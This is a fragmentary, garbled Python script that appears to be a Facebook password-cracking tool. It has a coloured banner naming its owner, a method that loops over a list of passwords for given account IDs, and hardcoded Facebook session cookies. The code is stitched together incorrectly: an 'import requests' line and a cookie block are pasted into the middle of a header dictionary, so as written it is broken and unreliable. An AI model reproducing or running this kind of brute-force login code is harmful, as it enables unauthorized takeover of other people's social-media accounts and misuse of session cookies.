...
\033[1;37m    ######      ######     ########  
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Noshan Haider
\033[1;37m Facebook:            Noshan Haider
\033[1;37m My GF  :            I Love You  ❤️ A ❤️
    ...
    def methodD(self, sid, name, psw):
        ...
        try:
            for pw in psw:
                ...
                session.headers = {}
                session.headers.update({import requests

cookies = {
    'datr': 'aDA9ZCzcfcxfrYN99lCLykNh',
    'sb': 'aDA9ZLefCo6bEK0lRALF8_eP',
    'm_pixel_ratio': '2',
    'wd': '360x628',
    'dnonce': 'AWnPuZv8OvjQgI24ysKKfiY_0W6rxKFvbS1d9BzhfNd4zOesETtNbX5dHs1sl4bP2Hvo8bshz0WWgL1s7lCGoNre',
    'fr': '0NK18jg9HiXYo2P7w..BkPTBo.16.AAA.0.0.BkPTX2.AWUuTST9V_w',
}
...
headers = {
    ...
    # 'cookie': 'datr=aDA9ZCzcfcxfrYN99lCLykNh; sb=aDA9ZLefCo6bEK0lRALF8_eP; m_pixel_ratio=2; wd=360x628; dnonce=AWnPuZv8OvjQgI24ysKKfiY_0W6rxKFvbS1d9BzhfNd4zOesETtNbX5dHs1sl4bP2Hvo8bshz0WWgL1s7lCGoNre; fr=0NK18jg9HiXYo2P7w..BkPTBo.16.AAA.0.0.BkPTX2.AWUuTST9V_w',
